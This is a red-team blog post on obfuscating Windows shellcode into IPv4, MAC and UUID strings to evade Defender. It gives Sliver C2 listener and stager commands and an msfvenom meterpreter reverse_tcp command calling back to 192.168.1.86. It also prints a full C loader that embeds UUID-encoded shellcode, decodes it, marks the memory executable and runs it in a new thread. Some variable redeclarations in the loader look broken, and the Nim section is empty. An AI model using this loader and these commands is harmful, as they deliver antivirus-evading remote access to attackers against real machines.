---
title: Offensive C & Nim - Shellcode Obfuscation
author: nirajkharel
date: 2025-05-24 14:10:00 +0800
categories: [Red Teaming, Offensive Programming]
tags: [Red Teaming, Offensive Programming]
render_with_liquid: false
---


## Shellcode
We have already discussed about [process injection using shellcode](https://nirajkharel.com.np/posts/process-injection-shellcode/) which pretty much explains about the shellcode, why and how to use it.

Giving the background again, shellcode is just a collection of instructions within the windows system which executes the command inorder to take a control or generates the reverse shell connection to an attacker machine. Below is a simple example of generating windows reverse tcp payload/shellcode which is obviously detected easily by Windows Defender.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-1.png">

## Shellcode Obfuscation
There are usually two types of techniques to bypass Defender detection which are Encryption and Obfuscation. In this module, we will be focusing on different types of Shellcode Obsufcation.

Obfuscation is just a technique to transfer or modify the raw shellcode into different forms which are harder to detect or analyze. There are various types of Obfuscation techniques such as IPv4/IPv6, MAC and UUID Obfuscations.

### IPv4/IPv6 Obfuscation 
IPv4/IPv6 Obfuscation generally consists of a technique which converts the raw shellcode into IPv4 or IPV6 style syntax. 

IPv4Fuscation converts each byte of the shellcode to their corresnponding octets. Since IPv4 address contains 4 octets `192.168.1.0`, IPv4 obfuscation converts each byte of the shellcode into each octet of the IPv4 by converting the bytes in hex into the decimal.

Example: For this chunk of the raw payload `"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"`, IPv4 slipts it into 4-byte chucnks to form IPv4 addresses. It first divides them into 4-byte groups as shown below:

```
\xfc \x48 \x83 \xe4
\xe8 \xcc \x00 \x00
\x00 \x41 \x51 \x41
\x50 \x00 \x00 \x00
```
And then convers each byte into the decimal format, which results in:

```
[252, 72, 131, 228]
[232, 204, 0, 0]
[0, 65, 81, 65]
[80, 0, 0, 0]
```

And then finally it is organised into IPv4 addresses:
```
252.72.131.228
240.232.204.0
0.0.65.81
65.80.0.0
```

This is how you can get your shellcode/payload obfuscated into IPv4 formats.

You can refer to this [blog from Kylerosario](https://www.kylerosario.com/blog/IPObfuscation) to understand in detail on how and what are the functions that are being called during the obfuscation and deobfuscation. But we can use a pre-built tools like [HellShell](https://github.com/NUL0x4C/HellShell) and [Supernova](https://github.com/nickvourd/Supernova) to do this.

Below is an example which shows how we can use a tool like Supernova to obfuscate the payload.
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-2.png">

Similar technique can be used on IPv6Fuscation where the shellcodes are grouped into 16 bytes to generated one IPv6 address. Again for the detailed explanation, you can navigate to Kylerosario blog. Since IPv6 addresses are expressed in hexadecimal, converting it into decimal is not needed.
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-3.png">

### MACFuscation
MACFuscation consists of the techqniue of converting raw shellcode into MAC addresses `aa:bb:cc:dd:ee:ff`. Each `aa, bb` represents one byte in hexadecimal. Since a typical MAC address contains 6 bytes, therefore the shellcode is grouped into 6 bytes and then converted into the MAC addresses. If its not the multiple of 6 bytes, padding is used on it.

We can use the same tool to convert our shellcode into MAC address.
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-4.png">

### UUIDFuscation
UUIDFuscation is a technique to obfuscate raw shellcode into UUID format `550e8400-e29b-41d4-a716-446655440000`. The raw shellcode is grouped into 16 bytes chunks as each UUID represents 16 bytes. When the shellcode is not muliple of 16, padding can bse used.
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-5.png">

Since now we have explored at least 3 types of obfuscation techniques, lets move towards a practical demonstrations. But before that one important thing to understand and required is that we need to deobfuscate the payload as well. The **deobfuscation** is usually done before allocating the shellcode into virtual memory. We will explore one of the technique of **deobfuscation** on the demonstration itself.

## Sliver Shellcode Generation
The first step for the demonstration would be to create a shellcode. We will be using **Sliver C2** to create a shellcode and listen for the callback.

Setting up Sliver C2 is outside of this blog's objective. However, you can simply setup the Sliver C2 server and client following the [offical documentation of Sliver](https://sliver.sh/docs?name=Getting+Started).

Once you have your sliver client ready and up running. Create a profile using below command:
```
profiles new beacon --mtls 192.168.1.86:443 --format shellcode shellcode-beacon
```
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-6.png">

Create a stager listener on port 8080. This listener delivers staged payloads and start the mTLS C2 server on host 192.168.1.86 and port 443.
```
stage-listener -u tcp://192.168.1.86:8080 -p shellcode-beacon

mtls -L 192.168.1.86 -l 443
```
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-7.png">

The victim machine runs stager delivered through port 8080, receives the beacon shellcode and connects back via mTLS.

We can either use sliver **generate stager** command or msfvenom to generate our shellcode. For sliver stagers, it just call the msfvenom APIs, so there would be no difference on the shellcode.   
**Using Sliver**
```
generate stager --lhost 192.168.1.86 --lport 8080 --protocol http --save /tmp
```

**Using msfvenom**
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.86 LPORT=8080 -f raw -o /tmp/win-shellcode.bin
```

## Obfuscation using Supernova
```
./Supernova -obf UUID -input /tmp/win-shellcode.bin -lang C
```
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-9.png">

But as we have already mentioned earlier that we need to deobfuscate the payload as well. Using the tools like HellShell would be much easier on this case, since it not only provides the obfuscated code, but also provides a code block inorder to deobfuscate it. So, once we transfer the payload on our Windows attacker machine, we can use HellShell to obsucate it. Make sure to compile the HellShell on **Release** otherwise it would give some errors.
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-10.png">

Until now, we have everything ready to listen and wait for the connection on the C2 side. Now lets talk about the deobfuscation of the payload. The below code is the output of HellShell which contains a function **UuidDeobfuscation whose** return type is BOOL.    

```C
// Execute
HellShell.exe .\win-shellcode.bin uuid

// Output
char* UuidArray[] = {
        "E48348FC-E8F0-00CC-0000-415141505251", "56D23148-4865-528B-6048-8B5218488B52", "B70F4820-4A4A-314D-C948-8B72504831C0",
        "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "528B4852-4120-8B51-423C-4801D0668178", "0F020B18-7285-0000-008B-808800000048",
        "6774C085-0148-8BD0-4818-448B40205049", "56E3D001-314D-48C9-FFC9-418B34884801", "C03148D6-41AC-C9C1-0D41-01C138E075F1",
        "244C034C-4508-D139-75D8-58448B402449", "4166D001-0C8B-4448-8B40-1C4901D0418B", "58418804-5841-595E-4801-D05A41584159",
        "83485A41-20EC-5241-FFE0-5841595A488B", "FF4BE912-FFFF-495D-BE77-73325F333200", "49564100-E689-8148-ECA0-0100004989E5",
        "0002BC49-901F-A8C0-0156-41544989E44C", "BA41F189-774C-0726-FFD5-4C89EA680101", "41590000-29BA-6B80-00FF-D56A0A415E50",
        "C9314D50-314D-48C0-FFC0-4889C248FFC0", "41C18948-EABA-DF0F-E0FF-D54889C76A10", "894C5841-48E2-F989-41BA-99A57461FFD5",
        "0A74C085-FF49-75CE-E5E8-930000004883", "894810EC-4DE2-C931-6A04-41584889F941", "C8D902BA-FF5F-83D5-F800-7E554883C420",
        "6AF6895E-4140-6859-0010-000041584889", "C93148F2-BA41-A458-53E5-FFD54889C349", "314DC789-49C9-F089-4889-DA4889F941BA",
        "5FC8D902-D5FF-F883-007D-285841575968", "00004000-5841-006A-5A41-BA0B2F0F30FF", "415957D5-75BA-4D6E-61FF-D549FFCEE93C",
        "48FFFFFF-C301-2948-C648-85F675B441FF", "006A58E7-4959-C2C7-F0B5-A256FFD59090"
};

#define NumberOfElements 32


typedef RPC_STATUS (WINAPI* fnUuidFromStringA)(
        RPC_CSTR        StringUuid,
        UUID*           Uuid
);

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize) {

                PBYTE           pBuffer         = NULL,
                                TmpBuffer       = NULL;

                SIZE_T          sBuffSize       = NULL;

                PCSTR           Terminator      = NULL;

                NTSTATUS        STATUS          = NULL;

                // getting UuidFromStringA   address from Rpcrt4.dll
                fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
                if (pUuidFromStringA == NULL) {
                                printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
                                return FALSE;
                }
                // getting the real size of the shellcode (number of elements * 16 => original shellcode size)
                sBuffSize = NmbrOfElements * 16;
                // allocating mem, that will hold the deobfuscated shellcode
                pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
                if (pBuffer == NULL) {
                        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
                        return FALSE;
                }
                // setting TmpBuffer to be equal to pBuffer
                TmpBuffer = pBuffer;


                // loop through all the addresses saved in Ipv6Array
                for (int i = 0; i < NmbrOfElements; i++) {
                        // UuidArray[i] is a single UUid address from the array UuidArray
                        if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
                                // if failed ...
                                printf("[!] UuidFromStringA  Failed At [%s] With Error 0x%0.8X\n", UuidArray[i], STATUS);
                                return FALSE;
                        }

                        // tmp buffer will be used to point to where to write next (in the newly allocated memory)
                        TmpBuffer = (PBYTE)(TmpBuffer + 16);
                }

                *ppDAddress = pBuffer;
                *pDSize = sBuffSize;
                return TRUE;
} 

```

Main Method 

```C
// shellcode injection
int main() {
        PBYTE pDeobfuscatedPayload = NULL;
        SIZE_T sDeobfuscatedSize = NULL;

        // Injected Process
        printf("Injecting shellcode the Pid: %d \n", GetCurrentProcessId());

        // Breaking attack chain
        TCHAR username[UNLEN + 1];  // UNLEN is the max username length
        DWORD username_len = UNLEN + 1;

        if (GetUserName(username, &username_len)) {
                wprintf(L"Current user: %s\n", username);
        }
        else {
                wprintf(L"GetUserName failed. Error code: %lu\n", GetLastError());
        }

        // Payload Decryption
        printf("Decrypting the payload.");                                                                                                                                        if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
                return -1;
        }

        printf("Deobfuscated payload at: 0x%p Of Size: %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);

        // Breaking attack chain
        TCHAR username[UNLEN + 1];  // UNLEN is the max username length
        DWORD username_len = UNLEN + 1;

        if (GetUserName(username, &username_len)) {
                wprintf(L"Current user: %s\n", username);
        }
        else {
                wprintf(L"GetUserName failed. Error code: %lu\n", GetLastError());
        }

        // Allocating memory the size of sDeobfuscatedSize
        // With memory permissions set to read and write so that we can write the payload later
        PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pShellcodeAddress == NULL) {
                printf("VirtalAlloc failed with error: %d \n", GetLastError());
                return -1;
        }

        printf("Allocated memory at: 0x%p \n", pShellcodeAddress);

        // Breaking the chain
        TCHAR username[UNLEN + 1];  // UNLEN is the max username length
        DWORD username_len = UNLEN + 1;

        if (GetUserName(username, &username_len)) {
                wprintf(L"Current user: %s\n", username);
        }
        else {
                wprintf(L"GetUserName failed. Error code: %lu\n", GetLastError());
        }

        // Copying the payload to the allocated memory
        memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);

        // Cleaning the pDeobfuscatedPayload buffer, since it no longer needed
        memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);

        DWORD dwOldProtection = NULL;
        // setting memory permissions at pShellCodeAddress to be executable
        if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
                printf("VirtualProtect failed with error: %d \n", GetLastError());
                return -1;

        }

        TCHAR username[UNLEN + 1];  // UNLEN is the max username length
        DWORD username_len = UNLEN + 1;

        if (GetUserName(username, &username_len)) {
                wprintf(L"Current user: %s\n", username);
        }
        else {
                wprintf(L"GetUserName failed. Error code: %lu\n", GetLastError());
        }

        // Running the shellcode as a new thread's entry
        if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
                printf("CreateThread Failed with error: %d \n", GetLastError());
                return -1;
        }

        // Freeing pDeobfuscatedPayload
        HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
        printf("Press Enter to Quit...");
        getchar();

        return 0;
}
```

Build
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-11.png">

ThreatCheck
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-12.png">

Execute
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-13.png">

## Obfuscation using Nim

#### References